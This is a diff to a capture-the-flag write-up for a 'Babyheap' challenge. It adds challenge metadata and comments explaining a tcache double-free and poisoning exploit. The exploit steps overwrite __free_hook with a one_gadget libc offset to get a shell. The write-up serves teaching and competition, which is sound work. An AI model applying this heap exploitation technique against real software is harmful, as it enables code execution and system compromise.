@@ -1,4 +1,13 @@
 # Babyheap
+### Description
+You can never get away from these pesky baby challenges. So I thought, if you can't beat them, join them!
+
+#### Author
+Tango
+#### Points and solves
+498 points, and 18 solves.
+
+
 We are given a classic heap exploitation binary, where we have the ability to malloc, free and show chunks in the memory.
 The binary is has a ```while true``` that runs these options:
 ```
@@ -99,14 +108,14 @@ Where the pointer to the chunk actually point to the ```fd``` member.
 Now, imagine:
 ```c
 malloc(0x10) // chunk #1
-free(chunk1) 
-free(chunk1)
+free(chunk1) // tcache: chunk1
+free(chunk1) // tcache: chunk1 -> chunk1
 ```
-The tcache will have the two same chunks, were the first chunk ```fd``` member points to itself.
+The tcache will have the two same chunks, where the first chunk ```fd``` member points to itself.
 Now,
 ```c
-malloc(0x10) // we get the same chunk1, the first in the tcache
-write(chunk1, address) // write some address to the newly malloc'd chunk.
+malloc(0x10) // we get the same chunk1, the first in the tcache.
+write(chunk1, address) // write some address to the newly malloc'd chunk. tcache: chunk1 -> address
 malloc(0x10) // we get the same chunk2, the second in the tcache.
 malloc(0x10) // we get a chunk that points to address!
 ```
@@ -124,7 +133,7 @@ alloc(6, 0x10, 8*b"C")
 alloc(7, 0x10, p64(libc.address + 0x4f3c2))
 ```
 allocating chunk 5 and writing ```__free_hook``` to it, will poison the tcache.
-allocating chunk 6 will give us the 2nd ```free(2)``` entry from the tcache
+allocating chunk 6 will give us the 2nd ```free(2)``` entry from the tcache.
 Chunk 7 will point to ```__free_hook```, and we write the address of a ```one_gadget``` there.
 
 Now simply ```free(0)``` and we get shell.
